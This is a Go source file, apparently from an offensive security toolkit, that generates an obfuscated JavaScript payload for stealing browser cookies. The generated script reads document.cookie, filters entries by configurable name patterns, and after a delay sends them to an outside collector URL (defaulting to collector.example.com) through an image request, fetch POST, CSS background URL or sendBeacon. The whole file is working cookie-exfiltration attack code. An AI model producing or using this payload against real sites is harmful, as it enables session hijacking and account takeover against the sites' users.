package payloads

import (
	"fmt"
	"strings"
)

// CookieExfilConfig holds configuration for cookie exfiltration payload.
type CookieExfilConfig struct {
	TargetPatterns  []string `json:"target_patterns,omitempty"`
	ExfilMethod     string   `json:"exfil_method,omitempty"` // "image" | "fetch" | "css" | "beacon"
	IncludeHttpOnly bool     `json:"include_http_only,omitempty"`
	SessionCookies  bool     `json:"session_cookies,omitempty"`
	ExfilEndpoint   string   `json:"exfil_endpoint,omitempty"`
	ExfilURL        string   `json:"exfil_url,omitempty"`
	DelayMs         int      `json:"delay_ms,omitempty"`
}

// GenerateCookieExfil creates a JavaScript cookie exfiltration payload.
func GenerateCookieExfil(cfg CookieExfilConfig) (string, error) {
	if cfg.ExfilEndpoint == "" {
		cfg.ExfilEndpoint = strings.TrimSpace(cfg.ExfilURL)
	}
	if cfg.ExfilEndpoint == "" {
		cfg.ExfilEndpoint = "https://collector.example.com/cookies"
	}
	if cfg.DelayMs <= 0 {
		cfg.DelayMs = 2000
	}

	varName := randomString(8)
	funcName := randomString(10)

	var methods map[string]string
	switch cfg.ExfilMethod {
	case "image":
		methods = map[string]string{
			"send": fmt.Sprintf(`new Image().src='%s?c='+btoa(JSON.stringify(%s));`, cfg.ExfilEndpoint, varName),
		}
	case "fetch":
		methods = map[string]string{
			"send": fmt.Sprintf(`fetch('%s',{method:'POST',body:JSON.stringify(%s),keepalive:true});`, cfg.ExfilEndpoint, varName),
		}
	case "css":
		methods = map[string]string{
			"send": fmt.Sprintf(`var d=document.createElement('div');d.style.background='url(%s?c='+btoa(JSON.stringify(%s))+')';document.body.appendChild(d);setTimeout(function(){d.remove();},100);`, cfg.ExfilEndpoint, varName),
		}
	case "beacon":
		methods = map[string]string{
			"send": fmt.Sprintf(`navigator.sendBeacon('%s',JSON.stringify(%s));`, cfg.ExfilEndpoint, varName),
		}
	default:
		methods = map[string]string{
			"send": fmt.Sprintf(`new Image().src='%s?c='+btoa(JSON.stringify(%s));`, cfg.ExfilEndpoint, varName),
		}
	}

	// Build target pattern matching
	patternMatch := "true" // Default: capture all
	if len(cfg.TargetPatterns) > 0 {
		patterns := make([]string, len(cfg.TargetPatterns))
		for i, p := range cfg.TargetPatterns {
			patterns[i] = fmt.Sprintf(`/^%s/.test(k)`, p)
		}
		patternMatch = strings.Join(patterns, "||")
	}

	payload := fmt.Sprintf(`(function(){
  var %s = {};
  var ck = document.cookie.split(';');
  for(var i=0;i<ck.length;i++){
    var p=ck[i].split('=');
    var k=p[0].trim();
    var v=p.slice(1).join('=').trim();
    if(%s){%s[k]=v;}
  }
  function %s(){%s}
  setTimeout(%s, %d);
})();`, varName, patternMatch, varName, funcName, methods["send"], funcName, cfg.DelayMs)

	return ObfuscateJS(payload), nil
}
